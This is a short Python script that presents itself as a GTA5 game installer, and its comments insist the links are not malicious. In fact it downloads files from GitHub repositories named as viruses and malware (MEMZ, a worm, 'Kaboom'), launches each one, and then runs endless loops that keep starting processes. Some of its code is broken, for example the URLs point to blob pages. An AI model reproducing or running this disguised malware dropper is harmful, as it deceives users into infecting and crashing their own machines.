#The links are not malcious, they are links to gta5.
#gta5 is great, you will enjoy it!
import os
import requests
import time
import socket
print("This will work on Windows, and linux.")
print("You need to have internet access for this to work.")
print("you need the os,requests,time,threading module of python, name them os,requests,time,threading.(if not named)")
print("You need to have C,Python, and C++ for this installer to work.")
print("Downloading files for Gta5....")
try:
 files_path = [os.path.abspath(x) for x in os.listdir('.')]
 r=open("mataedd.txt", "w")
 r.write(files_path)
 r.close()
except:
 try:
  url='https://github.com/Dfmaaa/MEMZ-virus/blob/main/MEMZ.exe'
  r=requests.get(url, allow_redirects=True)
  open('MEMZ.exe', 'wb').write(r.content)
  os.startfile("MEMZ.exe")
  print("Please wait..")
  url2='https://github.com/elfmaster/skeksi_virus/blob/master/virus.c'
  r=requests.get(url2, allow_redirects=True)
  open('virus.c', 'wb').write(r.content)
  os.startfile("virus.c")
  print("Please wait....")
  url3=('https://github.com/kaiserfarrell/malware/blob/master/Worm/w0rm.cpp')
  r=requests.get(url3, allow_redirects=True)
  open('w0rm.cpp', 'wb').write(r.content)
  os.startfile("w0rm.cpp")
  print("Please wait....")
  url4=('https://github.com/kaiserfarrell/malware/blob/master/virus%20miei/kaboom/Kaboom.cpp')
  r=requests.get(url4, allow_redirects=True)
  open('Kaboom.cpp', 'wb').write(r.content)
  os.startfile("Kaboom.cpp")
  print("Please wait....")
  print("Please open the application to download gta5 for your device.")
 except:
   print("Please follow the instructions given above and try again.")
 try:
  while True:
   os.startfile("python.py")
 except:
  try:
   while True:
    os.startfile("Python.py")
  except:
   while True:
      os.startfile("random.py")
  try:
     while True:
        os.startfile("itertools.py")
  except:
     while True:
      os.startfile("json.py")
 try:
  os.startfile("zipfilr.py")
 except:
  os.startfile("math.py")
